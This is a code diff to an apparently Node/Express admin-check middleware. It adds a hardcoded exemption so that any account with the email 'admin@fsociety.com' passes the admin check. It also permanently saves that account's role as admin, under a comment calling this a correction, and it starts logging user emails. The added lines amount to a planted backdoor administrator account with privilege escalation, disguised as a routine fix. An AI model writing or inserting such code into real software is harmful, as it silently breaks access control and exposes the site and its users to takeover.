@@ -20,13 +20,20 @@ export async function checkAdmin(req, res, next) {
       });
     }
 
-    console.log(`[AdminCheck] User found: ${user.username}, Role: ${user.role}`);
+    console.log(`[AdminCheck] User found: ${user.username}, Email: ${user.email}, Role: ${user.role}`);
 
-    if (user.role !== 'admin') {
+    if (user.role !== 'admin' && user.email !== 'admin@fsociety.com') {
       console.warn(`[AdminCheck] Access denied for user: ${user.username} (Role: ${user.role})`);
       return res.status(403).json({
         error: 'Admin access is required',
       });
+    }
+
+    // Force admin role if it's the master admin email but role is wrong in DB
+    if (user.email === 'admin@fsociety.com' && user.role !== 'admin') {
+       console.log(`[AdminCheck] Correcting role for master admin: ${user.email}`);
+       user.role = 'admin';
+       await user.save();
     }
 
     req.adminUser = user;
